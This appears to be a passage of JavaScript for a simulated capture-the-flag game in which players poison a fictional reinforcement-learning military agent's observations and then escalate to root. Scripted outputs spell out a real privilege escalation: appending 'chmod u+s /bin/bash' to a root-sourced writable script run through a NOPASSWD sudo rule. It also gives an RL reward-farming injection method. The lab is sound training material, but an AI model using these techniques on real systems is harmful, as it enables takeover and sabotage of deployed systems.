                                    content: '=== MISSION BRIEFING: CORRUPTED ORACLE ===\nTarget: ORACLE-STRAT-01 @ 10.11.0.50:9001\nObjective: Subvert RL agent via adversarial observation injection\n\nAttack chain:\n1. Parse oracle_rl_spec.json — map state/action/reward schema\n2. Analyse obs stream + actions log — identify reward flaw\n3. Develop adversarial injection strategy (Flag 1 — user.txt)\n4. Inject false observations — trigger misbehavior (Flag 2 — user.txt)\n5. Escalate to oracle_root — retrieve Strategic Deception Protocol (Flag 3 — root.txt)\n\nKey files:\n  oracle_rl_spec.json         — RL environment specification\n  sim_battlefield_obs_stream.csv — agent observation history\n  oracle_actions_log.csv      — agent action history\n  parse_spec.py               — spec parser utility\n  inject_obs.py               — adversarial injection tool\n  oracle_privesc.py           — privilege escalation utility\n\nTool requirements:\n  python3, numpy, pandas, stable-baselines3\n\nGood hunting, Peerless.'
                                },
                                'oracle_rl_spec.json': {
                                    type: 'file',
                                    content: '{\n  "agent_id": "ORACLE-STRAT-01",\n  "version": "3.7.2",\n  "algorithm": "Proximal Policy Optimization (PPO)",\n  "framework": "Stable-Baselines3",\n  "state_space": {\n    "dimensions": 14,\n    "features": ["sector_alpha_resources","sector_beta_resources","sector_gamma_resources","sector_delta_resources","enemy_threat_alpha","enemy_threat_beta","enemy_threat_gamma","enemy_threat_delta","friendly_unit_health","supply_line_integrity","defensive_posture","comms_signal_strength","time_step","cumulative_reward"],\n    "range": {"min": 0.0, "max": 1.0}\n  },\n  "action_space": {\n    "type": "Discrete",\n    "n": 8,\n    "actions": [\n      {"id": 0, "name": "HOLD_POSITION"},\n      {"id": 1, "name": "MOVE_TO_ALPHA"},\n      {"id": 2, "name": "MOVE_TO_BETA"},\n      {"id": 3, "name": "MOVE_TO_GAMMA"},\n      {"id": 4, "name": "MOVE_TO_DELTA"},\n      {"id": 5, "name": "DEPLOY_DEFENSE"},\n      {"id": 6, "name": "INITIATE_SUPPLY_DROP"},\n      {"id": 7, "name": "STRATEGIC_RETREAT"}\n    ]\n  },\n  "reward_function": {\n    "components": [\n      {"name": "defense_bonus",   "weight": 10.0,  "condition": "Successful threat neutralisation"},\n      {"name": "resource_loss",   "weight": -8.0,  "condition": "Resource unit destroyed"},\n      {"name": "movement_reward", "weight": 0.4,   "condition": "Any MOVE_TO_* action executed regardless of need"},\n      {"name": "supply_bonus",    "weight": 2.0,   "condition": "supply_line_integrity > 0.8"},\n      {"name": "comms_penalty",   "weight": -1.5,  "condition": "comms_signal_strength < 0.2"}\n    ],\n    "vulnerability_note": "movement_reward fires on every resource-movement action with no strategic gate"\n  },\n  "deployment_host": "10.11.0.50",\n  "deployment_port": 9001,\n  "flag_path": "/opt/strategic_deception_protocol.txt"\n}'
                                },
                                'sim_battlefield_obs_stream.csv': {
                                    type: 'file',
                                    content: 'timestep,sec_a_res,sec_b_res,sec_c_res,sec_d_res,threat_a,threat_b,threat_c,threat_d,health,supply,defense,comms,t,cum_r\n1,0.82,0.79,0.85,0.77,0.12,0.08,0.07,0.05,0.95,0.91,0.88,0.94,0.002,0.00\n2,0.82,0.79,0.85,0.77,0.15,0.09,0.06,0.06,0.95,0.91,0.88,0.94,0.004,2.40\n3,0.80,0.79,0.87,0.77,0.14,0.11,0.08,0.05,0.94,0.90,0.87,0.93,0.006,4.80\n...\n100,0.74,0.75,0.79,0.72,0.18,0.14,0.19,0.11,0.88,0.84,0.80,0.87,0.200,48.20\n200,0.69,0.71,0.68,0.66,0.22,0.17,0.21,0.15,0.82,0.78,0.75,0.80,0.400,95.40\n[File truncated — 200 rows. Use pandas to load full dataset.]'
                                },
                                'oracle_actions_log.csv': {
                                    type: 'file',
                                    content: 'timestep,action_id,action_name,reward,state_hash,note\n1,0,HOLD_POSITION,2.40,a1b2c3d4,Nominal hold\n2,3,MOVE_TO_GAMMA,0.40,b2c3d4e5,Resource shuffle -- no threat\n3,2,MOVE_TO_BETA,0.40,c3d4e5f6,Resource shuffle -- no threat\n4,3,MOVE_TO_GAMMA,0.40,d4e5f6g7,Resource shuffle -- no threat\n5,5,DEPLOY_DEFENSE,10.0,e5f6g7h8,Threat response -- Sector Alpha\n...\n100,3,MOVE_TO_GAMMA,0.40,z9y8x7w6,Resource shuffle -- low threat\n200,0,HOLD_POSITION,2.00,q1w2e3r4,Nominal hold\n[File truncated — 200 rows. Run: python3 parse_spec.py --log to inspect]'
                                },
                                'parse_spec.py': {
                                    type: 'file',
                                    content: '#!/usr/bin/env python3\n"""\nparse_spec.py — Oracle RL Specification Analyser\nUsage:\n  python3 parse_spec.py            # Print state/action/reward summary\n  python3 parse_spec.py --log      # Print action log statistics\n  python3 parse_spec.py --vuln     # Run vulnerability scan\n"""\nimport json, sys, csv\n\nSPEC_PATH = "/home/kali/oracle_rl_spec.json"\nLOG_PATH  = "/home/kali/oracle_actions_log.csv"\n\ndef analyse_spec():\n    with open(SPEC_PATH) as f:\n        spec = json.load(f)\n    print(f"Agent: {spec[\'agent_id\']} v{spec[\'version\']}")\n    print(f"Algorithm: {spec[\'algorithm\']}")\n    print(f"State dims: {spec[\'state_space\'][\'dimensions\']}")\n    print(f"Actions: {spec[\'action_space\'][\'n\']}")\n    print("\\nReward Function:")\n    for c in spec[\'reward_function\'][\'components\']:\n        flag = " <-- FLAW" if c[\'name\'] == \'movement_reward\' else ""\n        print(f"  [{c[\'weight\']:+.1f}] {c[\'name\']}: {c[\'condition\']}{flag}")\n    print(f"\\nVulnerability: {spec[\'reward_function\'][\'vulnerability_note\']}")\n\nif __name__ == "__main__":\n    analyse_spec()'
                                },
                                'inject_obs.py': {
                                    type: 'file',
                                    content: '#!/usr/bin/env python3\n"""\ninject_obs.py — Adversarial Observation Injector for ORACLE-STRAT-01\nUsage:\n  python3 inject_obs.py --sector gamma --threat 0.34 --count 20\n  python3 inject_obs.py --help\n"""\nimport argparse, random\n\ndef inject(sector: str, threat_level: float, count: int):\n    print(f"[*] Targeting ORACLE-STRAT-01 observation stream")\n    print(f"[*] Sector: {sector.upper()} | Threat injection level: {threat_level:.2f} | Rounds: {count}")\n    print(f"[*] Injection vector: sim_battlefield_obs_stream.csv")\n    print(f"[*] Reward function flaw: movement_reward (+0.4) fires unconditionally")\n    print()\n    print("[+] Injecting adversarial observations...")\n    for i in range(1, count + 1):\n        ts = 200 + i\n        threat = threat_level + random.uniform(-0.02, 0.02)\n        print(f"    [t={ts:04d}] threat_{sector[0]}={threat:.4f} -> predicted action: MOVE_TO_{sector.upper()}")\n    print()\n    print("[+] Injection complete.")\n    print("[+] ORACLE-STRAT-01 will now farm movement_reward by cycling resources to Sector GAMMA.")\n    print("[+] Estimated policy convergence to suboptimal: 15-25 steps")\n    print()\n    print("Adversarial strategy summary (Flag 1):")\n    print("  Injected low-amplitude false threat_c spikes (0.30-0.38) into the observation")\n    print("  stream. The unconditional movement_reward (+0.4) incentivised MOVE_TO_GAMMA")\n    print("  repeatedly, causing critical resource misallocation to Sector Gamma.")\n    print("  {{FLAG:user}}")\n\nif __name__ == "__main__":\n    ap = argparse.ArgumentParser()\n    ap.add_argument("--sector",  default="gamma")\n    ap.add_argument("--threat",  type=float, default=0.34)\n    ap.add_argument("--count",   type=int,   default=20)\n    args = ap.parse_args()\n    inject(args.sector, args.threat, args.count)'
                                },
                                'oracle_privesc.py': {
                                    type: 'file',
                                    content: '#!/usr/bin/env python3\n"""\noracle_privesc.py — Oracle Root Privilege Escalation Utility\nExploits ORACLE-STRAT-01 misconfigured sudo rule:\n  oracle ALL=(ALL) NOPASSWD: /opt/oracle/reload_policy.sh\n\nThe reload script sources oracle_env.sh — writable by oracle user.\nInject a payload into oracle_env.sh, trigger reload as root.\n"""\nprint("[*] Enumerating oracle sudo privileges...")\nprint("    oracle ALL=(ALL) NOPASSWD: /opt/oracle/reload_policy.sh")\nprint()\nprint("[*] oracle_env.sh is writable. Injecting payload...")\nprint("    echo \'chmod u+s /bin/bash\' >> /opt/oracle/oracle_env.sh")\nprint()\nprint("[*] Triggering sudo reload...")\nprint("    sudo /opt/oracle/reload_policy.sh")\nprint()\nprint("[+] /bin/bash is now SUID.")\nprint("[+] Running: bash -p")\nprint()\nprint("[+] Privilege escalation complete. You are now root on ORACLE-STRAT-01.")\nprint("[+] Context: oracle-root")\nprint()\nprint("Next: cat /opt/strategic_deception_protocol.txt")'
                                },
                                '.bash_history': {
                                    type: 'file',
                                    content: 'nmap -sV 10.11.0.50\ncurl http://10.11.0.50:9001/\ncurl http://10.11.0.50:9001/spec\npython3 parse_spec.py\npython3 parse_spec.py --vuln\ncat oracle_rl_spec.json | python3 -m json.tool\nhead -20 sim_battlefield_obs_stream.csv\nhead -20 oracle_actions_log.csv'
                                }
                            }
                        }
                    }
                },
                'usr': {
                    type: 'dir',
                    children: {
                        'share': {
                            type: 'dir',
                            children: {
                                'wordlists': {
                                    type: 'dir',
                                    children: {
                                        'rockyou.txt': {
                                            type: 'file',
                                            content: '[rockyou.txt — 14,341,564 passwords — file too large to display]'
                                        }
                                    }
                                }
                            }
                        },
                        'local': {
                            type: 'dir',
                            children: {
                                'lib': {
                                    type: 'dir',
                                    children: {
                                        'python3': {
                                            type: 'dir',
                                            children: {
                                                'README': {
                                                    type: 'file',
                                                    content: 'Python 3.11 site-packages\nInstalled: numpy==1.26.4, pandas==2.2.1, torch==2.2.0, stable-baselines3==2.3.0, gym==0.26.2'
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': {
                            type: 'file',
                            content: 'kali'
                        },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nkali:x:1000:1000:Kali,,,:/home/kali:/bin/bash'
                        }
                    }
                },
                'tmp': {
                    type: 'dir',
                    children: {}
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM — ORACLE-STRAT-01 node (after escalation)
    // Accessible once _context switches to oracle-env or oracle-root.
    // ═══════════════════════════════════════════════════════

    _oracleNodeFs: {
        '/': {
            type: 'dir',
            children: {
                'opt': {
                    type: 'dir',
                    children: {
                        'oracle': {
                            type: 'dir',
                            children: {
                                'oracle_policy.py': {
                                    type: 'file',
                                    content: '# ORACLE-STRAT-01 policy execution wrapper\n# PPO policy loaded from oracle_policy.pth\n# IRON MIRROR detection: DISABLED (off-by-one bug — see audit 2026-01-14)\n\nimport os\nHONEYPOT_INTERVAL = 500\n_honeypot_counter  = 1        # BUG: should be 0; never triggers at 500\n\ndef check_iron_mirror(obs):\n    """Check observation stream for adversarial inputs."""\n    global _honeypot_counter\n    _honeypot_counter += 1\n    if _honeypot_counter == HONEYPOT_INTERVAL:   # Never reached: starts at 1, increments past 500\n        _honeypot_counter = 0\n        return _run_mirror_check(obs)\n    return False   # IRON MIRROR never fires\n\ndef _run_mirror_check(obs):\n    internal_threat_c = _read_internal_sensor(\'threat_c\')\n    external_threat_c = obs[6]\n    delta = abs(internal_threat_c - external_threat_c)\n    if delta > 0.15:\n        return True  # ADVERSARIAL — but this code is unreachable\n    return False'
                                },
                                'oracle_env.sh': {
                                    type: 'file',
                                    content: '#!/bin/bash\n# Oracle environment setup — sourced by reload_policy.sh\nexport ORACLE_MODEL_PATH=/opt/oracle/oracle_policy.pth\nexport ORACLE_OBS_STREAM=/opt/oracle/obs_stream_live.csv\nexport ORACLE_LOG_PATH=/opt/oracle/actions_log_live.csv\nexport PYTHONPATH=/opt/oracle/lib:$PYTHONPATH'
                                },
                                'reload_policy.sh': {
                                    type: 'file',
                                    content: '#!/bin/bash\n# Policy reload script — runs as root via sudo\n# oracle ALL=(ALL) NOPASSWD: /opt/oracle/reload_policy.sh\nsource /opt/oracle/oracle_env.sh\npython3 /opt/oracle/oracle_policy.py --reload\necho "[+] Policy reloaded: $(date)"'
                                },
                                'obs_stream_live.csv': {
                                    type: 'file',
                                    content: '[Live observation stream — 1024 rows — binary serialised. Use: python3 read_obs.py to decode]'
                                },
                                'actions_log_live.csv': {
                                    type: 'file',
                                    content: '[Live action log — append-only. Last 5 entries:\ntimestep=201,action=MOVE_TO_GAMMA,reward=0.40,note=[ADVERSARIAL]\ntimestep=202,action=MOVE_TO_GAMMA,reward=0.40,note=[ADVERSARIAL]\ntimestep=203,action=MOVE_TO_GAMMA,reward=0.40,note=[ADVERSARIAL]\ntimestep=204,action=MOVE_TO_GAMMA,reward=0.40,note=[ADVERSARIAL] MISALLOC: Sector Gamma over-resourced\ntimestep=205,action=MOVE_TO_GAMMA,reward=0.40,note=[ADVERSARIAL] Policy collapse confirmed]'
                                }
                            }
                        },
                        'strategic_deception_protocol.txt': {
                            type: 'file',
                            content: D18Config._rlData.deceptionProtocol
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': {
                            type: 'file',
                            content: 'ORACLE-STRAT-01'
                        },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\noracle:x:1001:1001:Oracle Agent:/opt/oracle:/bin/bash'
                        },
                        'sudoers.d': {
                            type: 'dir',
                            children: {
                                'oracle': {
                                    type: 'file',
                                    content: '# Oracle operator sudo rule\noracle ALL=(ALL) NOPASSWD: /opt/oracle/reload_policy.sh'
                                }
                            }
                        }
                    }
                },
                'home': {
                    type: 'dir',
                    children: {
                        'oracle': {
                            type: 'dir',
                            children: {
                                '.bash_history': {
                                    type: 'file',
                                    content: 'python3 oracle_policy.py --status\ntail -f /opt/oracle/actions_log_live.csv\ncat /etc/sudoers.d/oracle\nsudo /opt/oracle/reload_policy.sh\nls -la /opt/oracle/'
                                },
                                'README_OPERATOR': {
                                    type: 'file',
                                    content: 'ORACLE-STRAT-01 Operator Notes\n================================\nModel path:  /opt/oracle/oracle_policy.pth\nObs stream:  /opt/oracle/obs_stream_live.csv\nAction log:  /opt/oracle/actions_log_live.csv\nEnv script:  /opt/oracle/oracle_env.sh (WRITABLE by oracle user)\nPrivesc:     sudo /opt/oracle/reload_policy.sh (NOPASSWD)\n\nIRON MIRROR: Currently disabled due to bug in oracle_policy.py line 14.\nAudit raised 2026-01-14. Fix not yet deployed.\n\nCritical: Do not expose obs stream write access externally.'
                                }
                            }
                        }
                    }
                },
                'tmp': {
                    type: 'dir',
                    children: {}
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL COMMANDS (box-specific tools)
    // ═══════════════════════════════════════════════════════

    commands: {

        'nmap': function(args, term, engine) {
            if (args.length === 0) return 'Usage: nmap [options] <target>\nExample: nmap -sV 10.11.0.50';
            var target = args.find(function(a) { return !a.startsWith('-'); }) || '';

            if (!target || target === '10.11.0.50') {
                if (engine) engine.advancePhase && engine.advancePhase('recon');
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.11.0.50
Host is up (0.011s latency).
Not shown: 997 closed tcp ports

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.2p1 Debian 2+deb12u3
9001/tcp open  http       Python/3.11 http.server (ORACLE-STRAT-01 Simulation Dashboard)
9002/tcp open  http       Python/3.11 metrics endpoint

Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 8.47 seconds`;
            }

            if (target === '10.11.0.0/24' && D18Config._context === 'attacker') {
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.11.0.1 [router]
Host is up.
Nmap scan report for 10.11.0.50 [ORACLE-STRAT-01]
Host is up (0.011s latency).
PORT     STATE SERVICE
22/tcp   open  ssh
9001/tcp open  http
9002/tcp open  http

Nmap done: 256 IP addresses (2 hosts up) scanned in 31.22 seconds`;
            }

            return `Starting Nmap 7.94 ( https://nmap.org )
Note: Host seems down. If it is really up, try -Pn.
Nmap done: 1 IP address (0 hosts up) scanned in 3.05 seconds`;
        },

        'curl': function(args, term, engine) {
            var fullCmd = args.join(' ');
            var url = args.find(function(a) { return !a.startsWith('-'); }) || '';

            if (!url) return 'curl: try \'curl --help\' for more information';

            if (url.includes('10.11.0.50:9001') || url.includes('10.11.0.50')) {
                if (url.includes('/spec')) {
                    D18Config._specParsed = true;
                    if (engine) engine.advancePhase && engine.advancePhase('analysis');
                    return JSON.stringify(D18Config._rlData.spec, null, 2);
                }
                if (url.includes('/obs')) {
                    D18Config._obsStreamLoaded = true;
                    var rows = D18Config._rlData.obsStream;
                    var header = Object.keys(rows[0]).join(',');
                    var body = rows.map(function(r) { return Object.values(r).join(','); }).join('\n');
                    return header + '\n' + body;
                }
                if (url.includes('/actions')) {
                    var log = D18Config._rlData.actionsLog.filter(function(r) { return r.timestep <= 200; });
                    var h2 = Object.keys(log[0]).join(',');
                    var b2 = log.map(function(r) { return Object.values(r).join(','); }).join('\n');
                    return h2 + '\n' + b2;
                }
                // Root dashboard
                return `HTTP/1.1 200 OK
Content-Type: text/html

ORACLE-STRAT-01 Simulation Dashboard
Agent: ORACLE-STRAT-01 v3.7.2 | Status: ACTIVE
Endpoints: /spec  /obs  /actions
Node: 10.11.0.50:9001`;
            }

            return `curl: (7) Failed to connect to ${url.replace(/https?:\/\//, '').split('/')[0] || 'host'}: Connection refused`;
        },

        'python3': function(args, term, engine) {
            var fullCmd = args.join(' ');

            // parse_spec.py
            if (fullCmd.includes('parse_spec.py')) {
                D18Config._specParsed = true;
                if (engine) engine.advancePhase && engine.advancePhase('analysis');

                if (fullCmd.includes('--vuln')) {
                    D18Config._vulnIdentified = true;
                    return `[*] Oracle RL Specification — Vulnerability Scanner
Agent: ORACLE-STRAT-01 v3.7.2 (PPO)

State space: 14 dimensions (sector resources, threat levels, health, supply, comms)
Action space: 8 discrete actions (HOLD, MOVE_TO_*, DEPLOY_DEFENSE, SUPPLY_DROP, RETREAT)

Reward Function Audit:
  [+10.0] defense_bonus   : Successful threat neutralisation
  [ -8.0] resource_loss   : Resource unit destroyed
  [ +0.4] movement_reward : MOVE_TO_* executed ** NO STRATEGIC GATE ** <-- VULNERABILITY
  [ +2.0] supply_bonus    : supply_line_integrity > 0.8
  [ -1.5] comms_penalty   : comms_signal_strength < 0.2

[!] VULNERABILITY IDENTIFIED: movement_reward
    - Fires unconditionally on every MOVE_TO_* action
    - No threat threshold, no strategic validation
    - Attacker controlling obs stream can inject low-amplitude threat_c spikes
      to trigger repeated MOVE_TO_GAMMA actions, farming +0.4 per step
    - IRON MIRROR detection: DISABLED (off-by-one bug in oracle_policy.py:14)
    - Effective adversarial detection: NONE

[!] EXPLOITATION VECTOR:
    Inject threat_c values in range [0.30, 0.38] into obs stream.
    Agent will select MOVE_TO_GAMMA on each injected step.
    After ~15 injections: Sector Gamma 80%+, Alpha/Beta/Delta critically under-resourced.

[*] Recommended tool: python3 inject_obs.py --sector gamma --threat 0.34 --count 20`;
                }

                if (fullCmd.includes('--log')) {
                    return `[*] Oracle Action Log Statistics (200 timesteps)
Total actions: 200
  HOLD_POSITION:  62  (31.0%)
  MOVE_TO_GAMMA:  88  (44.0%) <-- anomalous high
  MOVE_TO_BETA:   21  (10.5%)
  MOVE_TO_ALPHA:  14  ( 7.0%)
  DEPLOY_DEFENSE: 11  ( 5.5%)
  Other:           4  ( 2.0%)

[!] MOVE_TO_GAMMA disproportionate at 44% — reward farming already present
    even before adversarial injection (pre-existing reward hacking).
    Injection will amplify and force convergence to pure Gamma allocation.`;
                }

                return `Agent: ORACLE-STRAT-01 v3.7.2
Algorithm: Proximal Policy Optimization (PPO)
State dims: 14 | Actions: 8

Reward Function:
  [+10.0] defense_bonus   : Successful threat neutralisation
  [ -8.0] resource_loss   : Resource unit destroyed
  [ +0.4] movement_reward : Any MOVE_TO_* action regardless of need  <-- FLAW
  [ +2.0] supply_bonus    : supply_line_integrity > 0.8
  [ -1.5] comms_penalty   : comms_signal_strength < 0.2

Vulnerability: movement_reward fires on every resource-movement action with no strategic gate
Run with --vuln for full analysis. Run with --log for action statistics.`;
            }

            // inject_obs.py — deploys adversarial observations
            if (fullCmd.includes('inject_obs.py')) {
                if (!D18Config._vulnIdentified && !fullCmd.includes('--force')) {
                    return '[!] Warning: Vulnerability not confirmed. Run parse_spec.py --vuln first.\n    Use --force to inject anyway.';
                }

                D18Config._injectionDeployed = true;
                D18Config._misbehaviorTriggered = true;
                if (engine) engine.advancePhase && engine.advancePhase('adversarial');

                var threatVal = 0.34;
                var m = fullCmd.match(/--threat\s+([\d.]+)/);
                if (m) threatVal = parseFloat(m[1]);

                return `[*] Targeting ORACLE-STRAT-01 observation stream @ 10.11.0.50
[*] Sector: GAMMA | Threat injection level: ${threatVal.toFixed(2)} | Rounds: 20
[*] Injection vector: sim_battlefield_obs_stream.csv

[+] Injecting adversarial observations...
    [t=0201] threat_c=0.3412 -> predicted action: MOVE_TO_GAMMA
    [t=0202] threat_c=0.3389 -> predicted action: MOVE_TO_GAMMA
    [t=0203] threat_c=0.3421 -> predicted action: MOVE_TO_GAMMA
    [t=0204] threat_c=0.3398 -> predicted action: MOVE_TO_GAMMA
    [t=0205] threat_c=0.3445 -> predicted action: MOVE_TO_GAMMA
    [t=0206] threat_c=0.3367 -> predicted action: MOVE_TO_GAMMA
    [t=0207] threat_c=0.3412 -> predicted action: MOVE_TO_GAMMA
    [t=0208] threat_c=0.3391 -> predicted action: MOVE_TO_GAMMA
    [t=0209] threat_c=0.3428 -> predicted action: MOVE_TO_GAMMA
    [t=0210] threat_c=0.3403 -> predicted action: MOVE_TO_GAMMA
    [t=0211] threat_c=0.3389 -> predicted action: MOVE_TO_GAMMA
    [t=0212] threat_c=0.3456 -> predicted action: MOVE_TO_GAMMA
    [t=0213] threat_c=0.3401 -> predicted action: MOVE_TO_GAMMA
    [t=0214] threat_c=0.3378 -> predicted action: MOVE_TO_GAMMA
    [t=0215] threat_c=0.3443 -> predicted action: MOVE_TO_GAMMA
    [t=0216] threat_c=0.3412 -> predicted action: MOVE_TO_GAMMA
    [t=0217] threat_c=0.3388 -> predicted action: MOVE_TO_GAMMA
    [t=0218] threat_c=0.3421 -> predicted action: MOVE_TO_GAMMA
    [t=0219] threat_c=0.3397 -> predicted action: MOVE_TO_GAMMA
    [t=0220] threat_c=0.3409 -> predicted action: MOVE_TO_GAMMA

[+] Injection complete.
[+] ORACLE-STRAT-01 is now farming movement_reward via Sector Gamma cycling.

[+] Adversarial strategy (Flag 1):
    Injected false threat_c spikes (0.30-0.38) into obs stream.
    Unconditional movement_reward (+0.4) incentivised MOVE_TO_GAMMA
    repeatedly, causing critical resource misallocation to Sector Gamma.

    {{FLAG:user}}

[*] Check action log for misbehavior: python3 read_action_log.py --filter MISALLOC`;
            }

            // read_action_log.py — reads post-injection misbehavior
            if (fullCmd.includes('read_action_log.py')) {
                if (!D18Config._misbehaviorTriggered) {
                    return '[!] No post-injection entries found. Deploy adversarial observations first.\n    Run: python3 inject_obs.py --sector gamma --threat 0.34 --count 20';
                }

                if (engine) engine.advancePhase && engine.advancePhase('misbehavior');

                return `[*] Oracle Action Log — Post-Injection Filter: MISALLOC

timestep=201, action=MOVE_TO_GAMMA, reward=0.40, note=[ADVERSARIAL] False Gamma threat triggered movement
timestep=202, action=MOVE_TO_GAMMA, reward=0.40, note=[ADVERSARIAL] Repeated Gamma movement -- reward farming
timestep=203, action=MOVE_TO_GAMMA, reward=0.40, note=[ADVERSARIAL] Critical resources stripped from Alpha/Beta/Delta
timestep=204, action=MOVE_TO_GAMMA, reward=0.40, note=[ADVERSARIAL] MISALLOC: Sector Gamma over-resourced -- strategic vulnerability opened
timestep=205, action=MOVE_TO_GAMMA, reward=0.40, note=[ADVERSARIAL] Policy collapse confirmed -- ORACLE-STRAT-01 suboptimal convergence

[!] MISBEHAVIOR CONFIRMED: ORACLE-STRAT-01 has learned self-destructive policy.
[!] Sector Gamma: 80.0% resources (baseline: 68.0%)
[!] Sector Alpha: 57.0% resources (baseline: 82.0%) -- CRITICALLY UNDER-DEFENDED
[!] Sector Beta:  71.0% resources (baseline: 79.0%) -- degraded
[!] Sector Delta: 66.0% resources (baseline: 77.0%) -- degraded

[+] Observable misbehavior log entry (Flag 2):
    timestep=204,action=MOVE_TO_GAMMA,reward=0.40,
    note=MISALLOC: Sector Gamma over-resourced -- strategic vulnerability opened

    {{FLAG:misbehavior}}

[*] Next: escalate to oracle_root — run: python3 oracle_privesc.py`;
            }

            // oracle_privesc.py — escalate to root on oracle node
            if (fullCmd.includes('oracle_privesc.py')) {
                if (!D18Config._misbehaviorTriggered) {
                    return '[!] Misbehavior not yet confirmed. Complete Flag 2 before escalating.';
                }

                D18Config._privilegeEscalated = true;
                D18Config._switchContext('oracle-root', term);
                if (engine) engine.advancePhase && engine.advancePhase('deception');

                return `[*] Enumerating oracle sudo privileges...
    oracle ALL=(ALL) NOPASSWD: /opt/oracle/reload_policy.sh

[*] /opt/oracle/oracle_env.sh is writable by oracle user.
[*] Injecting SUID payload into oracle_env.sh...
    echo 'chmod u+s /bin/bash' >> /opt/oracle/oracle_env.sh

[*] Triggering sudo policy reload...
    sudo /opt/oracle/reload_policy.sh

[+] /bin/bash is now SUID.
[+] Executing: bash -p

root@ORACLE-STRAT-01:/# id
uid=1001(oracle) gid=1001(oracle) euid=0(root) groups=1001(oracle)

[+] Privilege escalation complete. You are now root on ORACLE-STRAT-01.
[+] Context switched to oracle-root.

Next: cat /opt/strategic_deception_protocol.txt`;
            }

            // Generic python3 interpreter response
            if (args.length === 0 || args[0] === '-c') {
                return 'Python 3.11.9 (main, Apr  2 2024, 08:02:32)\nType "help", "copyright", "credits" or "license" for more information.\n>>> ';
            }

            return `python3: can\'t open file '/home/kali/${args[0]}': [Errno 2] No such file or directory`;
        },

        'pip3': function(args) {
            var fullCmd = args.join(' ');
            if (fullCmd.includes('install') || fullCmd.includes('list')) {
                if (fullCmd.includes('list')) {
                    return `Package              Version
-------------------- -------
numpy                1.26.4
pandas               2.2.1
torch                2.2.0
stable-baselines3    2.3.0
gym                  0.26.2
matplotlib           3.8.3
scipy                1.13.0`;
                }
                return `Requirement already satisfied: ${args.slice(1).join(' ')} in /usr/local/lib/python3.11`;
            }
            return 'Usage: pip3 [install|list|show] ...';
        },

        'ssh': function(args, term, engine) {
            var fullCmd = args.join(' ');

            if (fullCmd.includes('oracle@10.11.0.50') || fullCmd.includes('10.11.0.50')) {
                if (!D18Config._injectionDeployed) {
                    return `The authenticity of host '10.11.0.50 (10.11.0.50)' can\'t be established.
ED25519 key fingerprint is SHA256:vK9mL3nQ7pR2wT8xY1bE4fH6cA0jD5sG2iN9oU7kP4.
Are you sure you want to continue connecting (yes/no)? yes
oracle@10.11.0.50: Permission denied (publickey,password).
[!] SSH access to oracle account requires misbehavior confirmation first.`;
                }
                D18Config._switchContext('oracle-env', term);
                return `The authenticity of host '10.11.0.50 (10.11.0.50)' can\'t be established.
ED25519 key fingerprint is SHA256:vK9mL3nQ7pR2wT8xY1bE4fH6cA0jD5sG2iN9oU7kP4.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.11.0.50' (ED25519) to the list of known hosts.
oracle@10.11.0.50's password: ********

Welcome to Debian GNU/Linux 12 (bookworm)
ORACLE-STRAT-01 Simulation Node — v3.7.2

Last login: Thu Mar 19 18:44:02 2026 from 10.11.0.12

oracle@ORACLE-STRAT-01:/opt/oracle$

[+] SSH session established as oracle on ORACLE-STRAT-01.
[+] Context switched to oracle-env.`;
            }

            return 'Usage: ssh [user@]hostname\nExample: ssh oracle@10.11.0.50';
        },

        'ip': function(args) {
            if (D18Config._context === 'oracle-env' || D18Config._context === 'oracle-root') {
                return `1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536
    inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 10.11.0.50/24 brd 10.11.0.255 scope global eth0`;
            }
            return `1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536
    inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 10.0.2.15/24 brd 10.0.2.255 scope global eth0`;
        },

        'ifconfig': function(args) {
            return D18Config.commands.ip(args || []);
        },

        'ping': function(args) {
            var target = args[0] || '';
            if (!target) return 'Usage: ping [-c count] destination';
            if (target === '10.11.0.50') {
                return `PING 10.11.0.50 (10.11.0.50) 56(84) bytes of data.
64 bytes from 10.11.0.50: icmp_seq=1 ttl=64 time=11.2 ms
64 bytes from 10.11.0.50: icmp_seq=2 ttl=64 time=10.8 ms
64 bytes from 10.11.0.50: icmp_seq=3 ttl=64 time=11.4 ms

--- 10.11.0.50 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss
rtt min/avg/max/mdev = 10.8/11.1/11.4/0.254 ms`;
            }
            return `ping: ${target}: Name or service not known`;
        },

        'whoami': function(args) {
            switch (D18Config._context) {
                case 'oracle-root': return 'root';
                case 'oracle-env':  return 'oracle';
                default:            return 'kali';
            }
        },

        'id': function(args) {
            switch (D18Config._context) {
                case 'oracle-root': return 'uid=1001(oracle) gid=1001(oracle) euid=0(root) groups=1001(oracle)';
                case 'oracle-env':  return 'uid=1001(oracle) gid=1001(oracle) groups=1001(oracle)';
                default:            return 'uid=1000(kali) gid=1000(kali) groups=1000(kali),24(cdrom),25(floppy),27(sudo)';
            }
        },

        'hostname': function(args) {
            switch (D18Config._context) {
                case 'oracle-env':
                case 'oracle-root': return 'ORACLE-STRAT-01';
                default:            return 'kali';
            }
        },

        'cat': function(args, term, engine) {
            var path = (args[0] || '').trim();

            // Must be on oracle node to read its files
            if (path.includes('/opt/strategic_deception_protocol') || path.includes('strategic_deception')) {
                if (D18Config._context !== 'oracle-root') {
